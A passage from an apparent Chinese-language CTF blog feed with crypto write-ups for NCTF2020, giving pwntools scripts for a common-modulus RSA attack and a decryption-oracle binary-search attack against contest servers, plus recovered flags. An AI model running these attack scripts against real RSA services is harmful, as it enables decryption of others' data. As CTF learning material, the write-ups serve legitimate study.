hex:&#x27;</span>)</span><br><span class="line">r.sendline(payload4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="BuyAndSell-2"><a href="#BuyAndSell-2" class="headerlink" title="BuyAndSell 2"></a>BuyAndSell 2</h2><p>PaddingOracleAttack确实很简单，但这压轴web我是一点办法都没有（</p><p>我是废物！</p><p><del>假装自己AK了，爬了爬了</del></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-C1CTF2020-39-s-Crypto&quot;&gt;&lt;a href=&quot;#Wp-for-C1CTF2020-39-s-Crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for C1CTF2020&amp;#39;s Crypto&quot;&gt;&lt;/a&gt;Wp for C1CTF2020&amp;#39;s Crypto&lt;/h1&gt;&lt;p&gt;先放一句话&lt;strong&gt;role=Tsunate;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;题目倒是蛮好玩的&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for NCTF&#39;s Crypto</title>
    <link href="http://example.com/2020/11/23/Wp_for_NCTF2020/"/>
    <id>http://example.com/2020/11/23/Wp_for_NCTF2020/</id>
    <published>2020-11-23T08:58:05.000Z</published>
    <updated>2021-03-11T01:25:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-NCTF2020-39-s-Crypto"><a href="#Wp-for-NCTF2020-39-s-Crypto" class="headerlink" title="Wp for NCTF2020&#39;s Crypto"></a>Wp for NCTF2020&#39;s Crypto</h1><p>题目很难，嗯，就是很难</p><p>题目质量<del>（我啥也不会也不敢评论）</del></p><p><del>我是废物！（大声）</del></p><a id="more"></a><h2 id="RRSA"><a href="#RRSA" class="headerlink" title="RRSA"></a>RRSA</h2><p>签到题，看完代码后发现是共膜，而且可以拿五次c，exgcd解决即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;42.192.180.50&quot;</span>, <span class="string">&quot;30002&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span>():</span></span><br><span class="line">rev = r.recvuntil(<span class="string">&quot;sha256(XXXX+&quot;</span>)</span><br><span class="line">suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">res = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashresult == res:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">r.sendline(str(prefix))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">e = int(r.recvuntil(<span class="string">&quot;, &quot;</span>).strip().decode()[:<span class="number">-1</span>])</span><br><span class="line">n = int(r.recvuntil(<span class="string">&quot;\n&quot;</span>).strip().decode())</span><br><span class="line"><span class="keyword">return</span> e,n</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">print(<span class="string">&#x27;Successfully pass!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;My public key: &quot;</span>)</span><br><span class="line">e1,n1 = read_data()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;encflag: &quot;</span>)</span><br><span class="line">c1 = int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;My new public key: &quot;</span>)</span><br><span class="line">e2,n2 = read_data()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;encflag: &quot;</span>)</span><br><span class="line">c2 = int(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">gcd, s, t = gcdext(e1, e2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(n1 == n2):</span><br><span class="line">n = n1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s &lt; <span class="number">0</span>):</span><br><span class="line">    s = -s</span><br><span class="line">    c1 = inverse(c1, n)</span><br><span class="line"><span class="keyword">if</span> (t &lt; <span class="number">0</span>):</span><br><span class="line">    t = -t</span><br><span class="line">    c2 = inverse(c2, n)</span><br><span class="line"></span><br><span class="line">plain = (pow(c1,s,n) % n) * (pow(c2,t,n) % n) % n</span><br><span class="line">print(long_to_bytes(plain))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/23/ySzJa2xRtPc3QDb.png" alt="23.png"></p><blockquote><p>NCTF{W3_1augh3d_4nd_k3pt_say1ng_s33_u_s00n__but_ins1d3_w3_b0th_kn3w_we_d_n3ver_see_e4ch_0ther_4gain}</p></blockquote><h2 id="RSA-revenge"><a href="#RSA-revenge" class="headerlink" title="RSA_revenge"></a>RSA_revenge</h2><p>Waiting for update……</p><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>此题是个有趣的题目，服务器会解密我们的数据，随后判断转换为<code>bytes</code>后首位（也就是二进制前8位）是否为0</p><p>分析：</p><ul><li>服务器只会告诉我们前8位是不是0，而并不能保证其后面的部分</li><li>如果我们想要得到明文的性质，就要想办法找到一个确切的关系，那么我们的任务即是将服务器中的条件转化或扩展成更加确切的值</li><li><code>bytes</code>最大1024位，而已知前8位，所以如果想要得到确切可控的数，最好的办法就是使得后面的全部为0，那么我们就可以利用服务器的条件，构造 $x$ 满足 $x\cdot m=2^{1016}$ ，从而求出明文</li></ul><p>方法：</p><ul><li>首先计算 $m\times 2^{cnt}$ 找到临界的 $x$ 使得其满足 $x\cdot m&lt;2^{1016}&lt;n$ （原因是为了避免出现 $x\cdot m=2^{1016}+k\cdot n$ 这种情况）</li><li>二分查找 $x$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;42.192.180.50&quot;</span>, <span class="string">&quot;30001&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span>():</span></span><br><span class="line">e = int(r.recvline().strip().decode())</span><br><span class="line">n = int(r.recvline().strip().decode())</span><br><span class="line">c = int(r.recvline().strip().decode())</span><br><span class="line"><span class="keyword">return</span> e,n,c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span>(<span class="params">x</span>):</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">r.sendline(str(x))</span><br><span class="line">res = r.recvline(<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">return</span> (<span class="string">b&#x27;True&#x27;</span> <span class="keyword">in</span>  res)</span><br><span class="line"></span><br><span class="line">e,n,c=read_data()</span><br><span class="line">print(<span class="string">&quot;Successfully get data!&quot;</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    res = c * pow(pow(<span class="number">2</span>, cnt , n), e, n)</span><br><span class="line">    back = talk(res)</span><br><span class="line">    <span class="keyword">if</span>(back == <span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Successfully get the range!&quot;</span>)</span><br><span class="line">upper = <span class="number">2</span> ** cnt</span><br><span class="line">lower = <span class="number">2</span> ** (cnt<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(lower+<span class="number">1</span> &lt; upper):</span><br><span class="line">    mid = (upper + lower) // <span class="number">2</span></span><br><span class="line">    res = c * pow(mid, e, n) % n</span><br><span class="line">    back = talk(res)</span><br><span class="line">    <span class="keyword">if</span>(back):</span><br><span class="line">        lower = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        upper = mid</span><br><span class="line"></span><br><span class="line">m = <span class="number">2</span> ** (<span class="number">1024</span> - <span class="number">8</span>)</span><br><span class="line">print(long_to_bytes(m//lower))</span><br><span class="line">print(long_to_bytes(m//upper))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/23/G7EI9vauH2kMXpS.png" alt="24.png"></p><blockquote><p>NCTF{M4rry_1n_hast3__4nd_r3pen7_4t_le1sure}</p></blockquote><h2 id="RDH"><a href="#RDH" class="headerlink" title="RDH"></a>RDH</h2><p>Waiting for update……</p><h2 id="RRSA-1"><a href="#RRSA-1" class="headerlink" title="RRSA"></a>RRSA</h2><p>Waiting for update……</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-NCTF2020-39-s-Crypto&quot;&gt;&lt;a href=&quot;#Wp-for-NCTF2020-39-s-Crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for NCTF2020&amp;#39;s Crypto&quot;&gt;&lt;/a&gt;Wp for NCTF2020&amp;#39;s Crypto&lt;/h1&gt;&lt;p&gt;题目很难，嗯，就是很难&lt;/p&gt;
&lt;p&gt;题目质量&lt;del&gt;（我啥也不会也不敢评论）&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;我是废物！（大声）&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
</feed>
